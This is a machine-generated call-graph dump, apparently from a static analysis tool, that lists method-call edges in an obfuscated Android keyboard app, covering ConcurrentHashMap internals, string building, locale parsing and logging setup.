INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String d()>
VIRTUAL edge: $z2 = virtualinvoke $r1.<java.lang.String: boolean isEmpty()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r1 = staticinvoke <izw: java.util.Collection at(java.lang.Iterable)>($r0) in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <izw: java.util.Collection at(java.lang.Iterable)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lma: int e(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<hbv: void j()>() in <hbv: boolean o()> ==> <hbv: void j()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.lang.Object[] s()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw d(java.util.Locale)> ==> <ivw: ivv I()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "cellsBusy") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, 0, $r3) in <lqq: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
STATIC edge: $z1 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r2, $r1) in <hbv: void k(java.lang.Object,boolean)> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lqc: void <init>()> ==> <lqd: void <init>()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int z(int,int,int,int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <ivw: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i5, $i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean x(int,int)>
CLINIT edge: staticinvoke <java.util.logging.Level: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.logging.Level: void <clinit>()>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i2, 2) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Invalid subtag: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <nvw: void j(int[],int[],int,int,int)>($r4, $r4, $i0, $i3, $i1) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void j(int[],int[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.util.List: int size()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int f(java.lang.Object)> ==> <ljd: boolean v()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r2, $r3) in <lli: void c(java.util.Map$Entry)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>
INTERFACE edge: $l0 = interfaceinvoke $r2.<ltn: long e()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: long e()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljf: java.lang.Object e(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lpi: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r1.<ltc: void <init>(java.lang.String,int,int)>("SMALL", 0, 10) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lkf: java.lang.Object get(java.lang.Object)>($r2) in <ivw: java.lang.String p()> ==> <lqk: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.IllegalStateException: void <init>(java.lang.String)>("cannot request log site information prior to postProcess()") in <lsn: lsq f()> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <jsg: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jsg: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_FULL_IMAGE", 8, 8) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: int size()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, $i1, $r3) in <lqk: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <lum: java.lang.String[] o()>() in <luk: void <clinit>()> ==> <lum: java.lang.String[] o()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Object cast(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: void <init>()>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r4) in <lqs: boolean equals(java.lang.Object)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>(0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<lsm: void <init>()>() in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: void <init>()>
SPECIAL edge: specialinvoke $r17.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/inputmethodentry/InputMethodEntryManager") in <hnt: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String substring(int)>($i0) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String substring(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lvt: void <init>(lvr)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r1 = staticinvoke <kwe: miy x(java.lang.Object)>(null) in <her: void <clinit>()> ==> <kwe: miy x(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<mii: void <init>()>() in <mij: void <init>(miy)> ==> <mii: void <init>()>
VIRTUAL edge: $i3 = virtualinvoke $r1.<java.lang.String: int length()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<java.util.Date: void <init>(long)>($l0) in <lsc: void f(java.lang.String,ltn)> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i4) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r1) in <lly: lma g()> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: $z0 = specialinvoke r0.<hbv: boolean o()>() in <hbv: boolean m(java.lang.Object)> ==> <hbv: boolean o()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r7, $i5, $i1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" but determined result is ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r3 = virtualinvoke $r25.<java.lang.Class: java.lang.String getName()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashSet: void <init>(int,float)>($i0, 1.0F) in <ljf: java.util.Set f()> ==> <java.util.LinkedHashSet: void <init>(int,float)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(12) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_GlobalAdditionalImeDefsLoaded", $r5) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i1) in <lkg: void g(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lwa: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwa: void <clinit>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, $i1, $i2) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <hbu: hbs f(java.lang.String,long)>("client_error_logging_level", $l0) in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <hbu: hbs f(java.lang.String,long)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lkx: boolean containsKey(java.lang.Object)>($r1) in <ivw: boolean P()> ==> <lkx: boolean containsKey(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lly g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lma: lly g()>
INTERFACE edge: interfaceinvoke $r1.<java.util.Set: boolean add(java.lang.Object)>($r2) in <ljf: java.util.Set f()> ==> <java.util.HashSet: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqo: void <init>(lkx,lkq)>(r0, $r1) in <lqq: lma g()> ==> <lqo: void <init>(lkx,lkq)>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<hny: void <init>(ivw,java.lang.String)>($r2, $r3) in <hny: hny a(hmm)> ==> <hny: void <init>(ivw,java.lang.String)>
VIRTUAL edge: $l2 = virtualinvoke $r1.<java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>(-4942790177534073029L) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>(0, "No logging platforms found:") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int d(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int f(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.util.Map m()> ==> <ljd: void p()>
STATIC edge: $r12 = staticinvoke <hnc: java.lang.String d(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hnc: java.lang.String d(hmm)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>($r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqm: java.lang.Object get(int)> ==> <iye: void O(int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("invalid maximum depth: 0") in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <ljs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljs: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(1) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwk: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r0, null) in <lqq: lqq a(int,java.lang.Object[])> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
SPECIAL edge: specialinvoke $r13.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_METADATA", 13, 13) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: int a()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorImageThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $z0 = virtualinvoke r0.<liz: boolean hasNext()>() in <liz: java.lang.Object next()> ==> <liz: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lkl: void <init>()>() in <lkq: lkl e()> ==> <lkl: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: int size()> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke r0.<lss: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: interfaceinvoke $r0.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(14) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] y()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lmb: void <init>()>() in <hbv: void j()> ==> <lmb: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
SPECIAL edge: specialinvoke $r1.<ljb: void <init>(ljd,int)>($r2, $i0) in <liw: java.lang.Object a(int)> ==> <ljb: void <init>(ljd,int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("forced", class "Ljava/lang/Boolean;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvr: int size()>() in <lvr: int b()> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqm: void <init>(lqn)> ==> <lkq: void <init>()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("group_by", $r1, 1) in <lsj: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagManager") in <hcb: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
